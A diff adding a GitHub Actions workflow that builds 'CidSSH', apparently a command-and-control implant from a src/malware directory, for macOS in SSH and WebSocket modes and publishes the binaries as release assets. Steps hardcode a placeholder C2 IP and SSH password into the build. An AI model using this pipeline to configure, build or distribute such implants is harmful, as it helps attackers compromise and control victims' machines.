@@ -1,0 +1,106 @@
+name: Build for macOS
+on: 
+    push:
+    pull_request:
+    release:
+      types: # This configuration does not affect the page_build event above
+        - created
+
+jobs:
+    build:
+        #if: github.event_name == 'push' && contains(toJson(github.event.commits), '***NO_CI***') == false && contains(toJson(github.event.commits), '[ci skip]') == false && contains(toJson(github.event.commits), '[skip ci]') == false
+        runs-on: macos-latest
+        steps:
+            - name: Hardcode the C2 IP if you want here
+              run: echo ::set-env name=C2_IP::1.2.3.4
+            - name: Hardcode the C2 SSH password if you want here
+              run: echo ::set-env name=PASSWORD_AUTH::paSSw0rD
+              
+            - uses: actions/checkout@v1
+              with:
+                  submodules: true
+            - name: Install OpenSSL/Boost from Homebrew
+              run: |
+                  brew install openssl pkg-config cmake boost git cmake
+            - name: Install vcpkg and libssh
+              run: |
+                  cd /tmp
+                  git clone https://github.com/Microsoft/vcpkg.git
+                  cd vcpkg
+                  echo "set(VCPKG_BUILD_TYPE release)" >> /tmp/vcpkg/triplets/x64-linux.cmake
+                  ./bootstrap-vcpkg.sh --allowAppleClang               
+                  VCPKG_FORCE_SYSTEM_BINARIES=1 VCPKG_BUILD_TYPE=release ./vcpkg install libssh[core,openssl] --triplet x64-osx
+            - name: Create build directory
+              run: |
+                  export LDFLAGS="-L/usr/local/opt/openssl/lib"
+                  export CPPFLAGS="-I/usr/local/opt/openssl/include"
+                  export PKG_CONFIG_PATH="/usr/local/opt/openssl/lib/pkgconfig"
+                  cmake --version
+                  cmake -S . -B build -DWITH_WEBSOCKETS=OFF -DC2_IP=$C2_IP -DPASSWORD_AUTH=$PASSWORD_AUTH -DCMAKE_TOOLCHAIN_FILE="/tmp/vcpkg/scripts/buildsystems/vcpkg.cmake" -DCMAKE_BUILD_TYPE=Release
+            - name: Build CidSSH in SSH mode
+              run: |
+                  export LDFLAGS="-L/usr/local/opt/openssl/lib"
+                  export CPPFLAGS="-I/usr/local/opt/openssl/include"
+                  export PKG_CONFIG_PATH="/usr/local/opt/openssl/lib/pkgconfig"
+                  cmake --build build -j8
+                  
+            - name: Create build directory
+              run: |
+                  export LDFLAGS="-L/usr/local/opt/openssl/lib"
+                  export CPPFLAGS="-I/usr/local/opt/openssl/include"
+                  export PKG_CONFIG_PATH="/usr/local/opt/openssl/lib/pkgconfig"
+                  cmake --version
+                  cmake -S . -B build_ws -DWITH_WEBSOCKETS=ON -DC2_IP=$C2_IP -DPASSWORD_AUTH=$PASSWORD_AUTH -DCMAKE_TOOLCHAIN_FILE="/tmp/vcpkg/scripts/buildsystems/vcpkg.cmake" -DCMAKE_BUILD_TYPE=Release
+            - name: Build CidSSH in Websocket mode
+              run: |
+                  export LDFLAGS="-L/usr/local/opt/openssl/lib"
+                  export CPPFLAGS="-I/usr/local/opt/openssl/include"
+                  export PKG_CONFIG_PATH="/usr/local/opt/openssl/lib/pkgconfig"
+                  cmake --build build_ws -j8
+            
+            #- name: Strip symbols from created malware
+            #  run: |
+            #      strip -s build/src/malware/CidSSH
+            #      strip -s build_ws/src/malware/CidSSH
+            
+            - uses: actions/upload-artifact@master
+              with:
+                  name: CidSSH_osx_ssh_x64
+                  path: build/src/malware/CidSSH                 
+            - uses: actions/upload-artifact@master
+              with:
+                  name: CidSSH_osx_ws_x64
+                  path: build_ws/src/malware/CidSSH
+
+    release:
+        runs-on: ubuntu-latest
+        if: github.event_name == 'release'
+        needs: build
+        steps:
+            - name: Download CidSSH ssh version
+              uses: actions/download-artifact@v1
+              with:
+                  name: CidSSH_osx_ssh_x64
+            - name: Upload ssh arifact to Github release
+              uses: actions/upload-release-asset@v1
+              env:
+                    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+              with:
+                  upload_url: ${{ github.event.release.upload_url }}
+                  asset_path: CidSSH_osx_ssh_x64/CidSSH
+                  asset_name: CidSSH_osx_ssh_x64
+                  asset_content_type: application/octet-stream
+                  
+            - name: Download CidSSH ws version
+              uses: actions/download-artifact@v1
+              with:
+                  name: CidSSH_osx_ws_x64
+            - name: Upload ws arifact to Github release
+              uses: actions/upload-release-asset@v1
+              env:
+                    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+              with:
+                  upload_url: ${{ github.event.release.upload_url }}
+                  asset_path: CidSSH_osx_ws_x64/CidSSH
+                  asset_name: CidSSH_osx_ws_x64
+                  asset_content_type: application/octet-stream      
